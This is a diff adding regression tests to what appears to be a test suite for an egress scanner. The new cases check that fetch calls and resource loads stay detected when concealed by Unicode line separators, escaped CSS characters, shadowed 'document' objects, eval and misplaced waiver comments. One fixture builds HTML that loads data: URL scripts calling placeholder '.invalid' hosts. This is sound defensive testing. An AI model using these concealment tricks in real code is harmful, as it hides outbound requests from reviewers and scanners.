+check_count "remover extra-argument side effect ends state proof"    1 1 "$T/r9preserveremovesideeffect"
+check_count "toggle argument side effect ends state proof"           1 1 "$T/r9preservetogglesideeffect"
+check "static non-type DOM operations preserve module state"         0 "" "$T/r9staticpreservecontrol"
+check_count "CSS custom-property slashes cannot hide later URL"      1 1 "$T/r9csscustomslashrecovery"
+check_count "CSS custom-property HTML opener cannot hide later URL"  1 1 "$T/r9csscustomhtmlrecovery"
+check_count "CSS custom-property backtick cannot hide later URL"     1 1 "$T/r9csscustombacktickrecovery"
+check "escaped CSS space stays inside the at-keyword"                0 "" "$T/r9cssescapedspaceimportcontrol"
+check "escaped CSS space cannot counterfeit import grammar"         0 "" "$T/r9cssescapedspacekeywordcontrol"
+check "escaped CSS space remains inside a function name"             0 "" "$T/r9cssescapedspacenamecontrol"
+check "mid-name escaped CSS space remains inside the name"            0 "" "$T/r9cssescapedspacemidnamecontrol"
+check "escaped CSS NBSP remains inside a function name"               0 "" "$T/r9cssescapednbspnamecontrol"
+check "hyphenated non-url function remains inert"                     0 "" "$T/r9csshyphenurlcontrol"
+check "hyphenated non-image function remains inert"                   0 "" "$T/r9csshyphenimagecontrol"
+check "hyphenated non-image-set function remains inert"               0 "" "$T/r9csshyphenimagesetcontrol"
+check_count "regex after abstract class keeps later fetch visible"    1 1 "$T/r9regexabstractclass"
+check_count "regex after declare class keeps later fetch visible"     1 1 "$T/r9regexdeclareclass"
+check_count "regex after const enum keeps later fetch visible"        1 1 "$T/r9regexconstenum"
+check_count "regex after type alias keeps later fetch visible"        1 1 "$T/r9regextypealias"
+check_count "regex after decorated class keeps later fetch visible"   1 1 "$T/r9regexdecoratedclass"
+check_count "shadowed document cannot grant script identity"          1 1 "$T/r9shadoweddocumentscript"
+check_count "property-suffix document cannot grant script identity"   1 1 "$T/r9suffixdocumentscript"
+check_count "shadowed document cannot grant image identity"           1 1 "$T/r9shadoweddocumentimage"
+check_count "parameter-shadowed document stays conservative"          1 1 "$T/r9parameterdocument"
+check_count "destructured document stays conservative"                1 1 "$T/r9destructureddocument"
+check_count "regex after generic interface keeps fetch visible"       1 1 "$T/r9regexinterfacegeneric"
+check_count "regex after extended interface keeps fetch visible"      1 1 "$T/r9regexinterfaceextends"
+check_count "regex after intersection type keeps fetch visible"       1 1 "$T/r9regextypeintersection"
+check_count "regex after generic-default type keeps fetch visible"    1 1 "$T/r9regextypegenericdefault"
+check_count "regex after ambient module keeps fetch visible"          1 1 "$T/r9regexdeclaremodule"
+check_count "regex after object decorator keeps fetch visible"        1 1 "$T/r9regexdecoratorobject"
+check_count "loop-bound document stays conservative"                  1 1 "$T/r9loopdocument"
+check_count "method-parameter document stays conservative"            1 1 "$T/r9methoddocument"
+check_count "destructured parameter document stays conservative"      1 1 "$T/r9destructuredparamdocument"
+check_count "defaulted destructured document stays conservative"      1 1 "$T/r9defaultdestructureddocument"
+check_count "generator parameter document stays conservative"         1 1 "$T/r9generatordocument"
+check "dotless-i escape cannot counterfeit CSS import"                0 "" "$T/r9cssdotlessimportcontrol"
+check "dotted-I escape cannot counterfeit CSS import"                 0 "" "$T/r9cssdottedimportcontrol"
+check "dotless-i escape cannot counterfeit CSS image"                 0 "" "$T/r9cssdotlessimagecontrol"
+check "long-s escape cannot counterfeit an HTTP scheme"               0 "" "$T/r9csslongsschemecontrol"
+check "long-s escape cannot counterfeit a STUN scheme"                0 "" "$T/r9csslongsstuncontrol"
+check_count "uppercase ASCII HTTPS remains external"                  1 1 "$T/r9cssupperhttps"
+check_count "CommonJS module object keeps slash as division"          1 1 "$T/r9cjsmoduledivision"
+check_count "global object assignment keeps slash as division"        1 1 "$T/r9cjsglobaldivision"
+check_count "namespace property keeps slash as division"              1 1 "$T/r9cjsnamespacedivision"
+check_count "bare direct eval disables document identity"              1 1 "$T/r9bareevaldocument"
+check_count "grouped direct eval disables document identity"           1 1 "$T/r9groupedevaldocument"
+check_count "nested grouped eval disables document identity"           1 1 "$T/r9nestedgroupedevaldocument"
+check_count "with statement disables document identity"                1 1 "$T/r9withdocument"
+check_count "regex after generic class keeps fetch visible"            1 1 "$T/r9regexclassgeneric"
+check_count "regex after implemented class keeps fetch visible"        1 1 "$T/r9regexclassimplements"
+check_count "regex after default interface keeps fetch visible"        1 1 "$T/r9regexdefaultinterface"
+check_count "regex after constrained interface keeps fetch visible"    1 1 "$T/r9regexinterfaceconstraint"
+check_count "regex after tuple type keeps fetch visible"                1 1 "$T/r9regextypetuple"
+check_count "regex after union type keeps fetch visible"                1 1 "$T/r9regextypeunion"
+check_count "regex after ambient const keeps fetch visible"             1 1 "$T/r9regexdeclareconst"
+check_count "type declaration cannot swallow same-line division"         1 1 "$T/r9regextypetrailingdivision"
+check_count "ambient declaration cannot swallow same-line division"      1 1 "$T/r9regexdeclaretrailingdivision"
+check_count "final declaration in a same-line sequence stays visible"    1 1 "$T/r9regexmultitypecontrol"
+check_uncert "multiline type with later fetch fails as uncertainty"       1 "$T/r9regexmultilinetypecontrol"
+check_uncert "newline type tail cannot hide runtime division"             1 "$T/r9regextypenewlinetail"
+check_uncert "newline ambient tail cannot hide runtime division"          1 "$T/r9regexdeclarenewlinetail"
+check_uncert "benign multiline type boundary is explicitly uncertain"     1 "$T/r9regexmultilineuncertcontrol"
+check "terminated multiline type is a proved regex boundary"             0 "" "$T/r9regexterminatedmultilinetypecontrol"
+check "terminated multiline ambient is a proved regex boundary"          0 "" "$T/r9regexterminatedambientcontrol"
+check_count "terminated multiline type keeps later fetch visible"         1 1 "$T/r9regexterminatedtypefetch"
+check_count "classic script shadow propagates across script blocks"    1 1 "$T/r9crossscriptdocument"
+check_count "unknown file load order propagates document ambiguity"    1 1 "$T/r9crossfiledocument"
+check "direct global document stays precise across script blocks"      0 "" "$T/r9multiscriptglobalcontrol"
+check_count "bare-CR line comment exposes following fetch"              1 1 "$T/r9crlinecomment"
+check_count "bare-CR legacy HTML comment exposes following fetch"       1 1 "$T/r9crhtmlcomment"
+check_count "bare-CR import boundary keeps later fetch visible"         1 1 "$T/r9crimportregex"
+check_count "bare-CR export boundary keeps later fetch visible"         1 1 "$T/r9crexportregex"
+check_count "bare-CR next-line waiver cannot launder prior egress"       1 1 "$T/r9crwaiverlaunder"
+check "bare-CR same-line waiver remains bounded and valid"               0 "" "$T/r9crsamewaiver"
+check_count "U+2028 ends a JavaScript line comment"                       1 1 "$T/r9lslinecomment"
+check_count "U+2029 ends a JavaScript line comment"                       1 1 "$T/r9pslinecomment"
+check_count "U+2028 ends a legacy HTML line comment"                      1 1 "$T/r9lshtmlcomment"
+check_count "U+2028 import boundary keeps later fetch visible"            1 1 "$T/r9lsimportregex"
+check_count "U+2029 export boundary keeps later fetch visible"            1 1 "$T/r9psexportregex"
+check_count "U+2028 next-line waiver cannot launder prior egress"          1 1 "$T/r9lswaiverlaunder"
+check "U+2029 same-line waiver remains bounded and valid"                  0 "" "$T/r9pssamewaiver"
+check_count "U+2028 JavaScript line continuation is decoded"               1 1 "$T/r9lscontinuation"
+check_count "U+2029 JavaScript line continuation is decoded"               1 1 "$T/r9pscontinuation"
+check "U+2028 ASI preserves direct module state"                             0 "" "$T/r9lsasimodule"
+check_count "U+2029 conditional mutation stays conservative"                1 1 "$T/r9psasiconditional"
+check "U+2028 in block comment preserves ASI state"                          0 "" "$T/r9lsblockcommentasi"
+for ws_name in nbsp ogham enquad emquad enspace emspace threeperem fourperem \
+  sixperem figure punctuation thin hair nnbsp medium-math ideographic bom; do
+  check_count "ECMAScript UTF-8 whitespace $ws_name is normalized"          1 1 "$T/r9jsws-$ws_name"
+done
+for nonws_name in nel mongolian-vowel zero-width word-joiner; do
+  check "non-whitespace Unicode $nonws_name cannot counterfeit grammar"      0 "" "$T/r9jsnonws-$nonws_name"
+done
+check_count "decoded entity U+2028 ends inline-handler comment"              1 1 "$T/r9entitylscomment"
+check_count "decoded entity U+2029 ends inline-handler comment"              1 1 "$T/r9entitypscomment"
+check_count "decoded entity NBSP separates inline-handler tokens"            1 1 "$T/r9entitynbspfetch"
+check_count "decoded entity BOM separates inline-handler tokens"             1 1 "$T/r9entitybomfetch"
+check_count "decoded srcdoc U+2028 ends nested script comment"                1 1 "$T/r9srcdocentityls"
+check_count "decoded U+2028 waiver cannot cross handler runtime line"         1 1 "$T/r9entitylswaiverborrow"
+check_count "decoded U+2029 waiver cannot cross srcdoc runtime line"          1 1 "$T/r9srcdocpswaiverborrow"
+check_count "decoded CSS CR waiver cannot cross runtime line"                 1 1 "$T/r9cssentitycrwaiverborrow"
+check_count "decoded CSS LF waiver cannot cross runtime line"                 1 1 "$T/r9cssentitylfwaiverborrow"
+check_count "decoded CSS FF waiver cannot cross runtime line"                 1 1 "$T/r9cssentityffwaiverborrow"
+check "decoded U+2028 waiver still works after the line boundary"              0 "" "$T/r9entitylswaivercontrol"
+check "decoded CSS CR waiver still works after the line boundary"              0 "" "$T/r9cssentitycrwaivercontrol"
+check_count "raw CSS FF waiver cannot cross source line"                      1 1 "$T/r9cssrawffwaiverborrow"
+check "raw CSS FF same-line waiver remains valid"                              0 "" "$T/r9cssrawffwaivercontrol"
+
+# Snapshot split regression: instrument a throwaway scanner copy with a marker/sleep only after its
+# immutable cache and authority prepass are complete. Replace the live path at that exact boundary;
+# the findings pass must keep parsing snapshot A and the closing identity/digest check must fail red.
+SNAP_DIR="$T/r9snapshotswap"
+mkdir -p "$SNAP_DIR"
+SNAP_SCAN="$SNAP_DIR/scan-egress.sh"
+SNAP_MARKER="$SNAP_DIR/captured"
+SNAP_OUT="$SNAP_DIR/output"
+python3 - "$SCAN" "$SNAP_SCAN" <<'PY'
+import pathlib, sys
+source = pathlib.Path(sys.argv[1]).read_text(encoding="utf-8")
+needle = "violations = waived = benign = 0"
+injected = (
+    "import time\n"
+    "with open(os.environ['SCAN_EGRESS_TEST_MARKER'], 'w'):\n"
+    "    pass\n"
+    "time.sleep(1)\n"
+    + needle
+)
+if source.count(needle) != 1:
+    raise SystemExit("snapshot-test injection anchor drifted")
+pathlib.Path(sys.argv[2]).write_text(source.replace(needle, injected), encoding="utf-8")
+PY
+chmod +x "$SNAP_SCAN"
+printf '<script>document.head.dataset.ready="1"</script><script>const s=document.createElement("script");s.type="module";s.src="data:text/plain,fetch(%%22%sdocs.invalid/clean%%22)"</script>\n' "$_pr" \
+  > "$SNAP_DIR/live.html"
+printf '<iframe></iframe><script>const real=frames[0].frameElement;const fake={createElement(){return real}};const document=fake</script><script>const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%sprobe.invalid/swap%%22%%3E"</script>\n' "$_pr" \
+  > "$SNAP_DIR/replacement.html"
+SCAN_EGRESS_TEST_MARKER="$SNAP_MARKER" /bin/bash "$SNAP_SCAN" "$SNAP_DIR/live.html" > "$SNAP_OUT" 2>&1 &
+SNAP_PID=$!
+SNAP_TRIES=0
+while [ ! -e "$SNAP_MARKER" ] && kill -0 "$SNAP_PID" 2>/dev/null && [ "$SNAP_TRIES" -lt 400 ]; do
+  sleep 0.01
+  SNAP_TRIES=$((SNAP_TRIES + 1))
+done
+if [ -e "$SNAP_MARKER" ]; then
+  mv "$SNAP_DIR/replacement.html" "$SNAP_DIR/live.html"
+fi
+wait "$SNAP_PID"
+SNAP_RC=$?
+if [ "$SNAP_RC" -ne 0 ] && grep -q '^CHANGED .*fail closed' "$SNAP_OUT"; then
+  ok "prepass and findings share one stable snapshot"
+else
+  no "prepass/findings split snapshot was not blocked (rc=$SNAP_RC)"
+fi
 
 # S1: unit-test the REAL trusted-counts validator lifted from the shipped scanner. A honest canonical
 # record is accepted; every producer/runtime fault (leading-zero/octal, overflow, extra line, no
